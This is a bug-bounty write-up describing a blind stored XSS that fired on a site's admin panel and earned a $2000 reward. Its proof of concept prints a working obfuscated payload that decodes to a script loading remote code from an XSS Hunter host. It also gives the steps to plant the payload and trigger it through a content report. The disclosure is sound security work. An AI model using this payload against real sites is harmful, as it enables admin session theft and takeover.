---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-24_blind-xss-fired-on-admin-panel-worth-2000.md
original_filename: 2023-02-24_blind-xss-fired-on-admin-panel-worth-2000.md
title: Blind XSS fired on Admin panel worth $2000
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: eafd19c1ef26d7cae844a6babfe3ab64d76a5195be1463563043e717cd6cce64
text_sha256: fbf89ee8cd0a826315ea23eb4e9f0bc5d2be28c66333d783b3d297ae78c3ea76
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS fired on Admin panel worth $2000

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-24_blind-xss-fired-on-admin-panel-worth-2000.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `eafd19c1ef26d7cae844a6babfe3ab64d76a5195be1463563043e717cd6cce64`
- Text SHA256: `fbf89ee8cd0a826315ea23eb4e9f0bc5d2be28c66333d783b3d297ae78c3ea76`


## Content

---
title: "Blind XSS fired on Admin panel worth $2000"
url: "https://medium.com/@feribytex/blind-xss-fired-on-admin-panel-worth-2000-abe2c83279b5"
authors: ["Feri Susanto (@feribytex)"]
bugs: ["Blind XSS"]
bounty: "2,000"
publication_date: "2023-02-24"
added_date: "2023-02-26"
source: "pentester.land/writeups.json"
original_index: 1480
scraped_via: "browseros"
---

# Blind XSS fired on Admin panel worth $2000

Feri Susanto
Follow
2 min read
·
Feb 24, 2023

128

3

Blind XSS fired on Admin panel worth $2000

Introduction:

Hello Hacker!!!

$whoami

I am Feri Susanto (fer1bytex0) from indonesia.

it is my first Write Up, In this writeup, we will discuss a found Blind XSS on Bugcrowd Private Program, let’s say it as target.com.

Press enter or click to view image in full size
https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png

Description:

Get Feri Susanto’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The vulnerability was a blind stored cross-site scripting (XSS) attack. The attacker could inject malicious code into the application, which would be stored in the database and executed admin page dashboard (admin.redacted.com).

Proof of concept:

1. Login to your account on redacted.com

2. And create Post Page

3. and filled title and Post body with Blind XSS payload

*in this case i use xsshunter payload.

"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veTEueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veTEueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
Press enter or click to view image in full size

4. now publish the Post.

5. Now Login to other account and navigate to url post, and report the content.

Press enter or click to view image in full size

After 3 day, i got notification email from Xsshunter.

The Payload fire on admin.redacted.com When administrator viewed my report content.

the team rewarded me with $2000 after 8 day i submited the report.

Press enter or click to view image in full size

Impact:

An attacker exploiting this vulnerability could gain access to sensitive information, compromise the admin panel, and potentially take control of the application. The attacker could also use the stolen admin session cookies to access the admin panel and perform actions on behalf of the admin.

Follow me on Twitter: https://twitter.com/berburuserangga
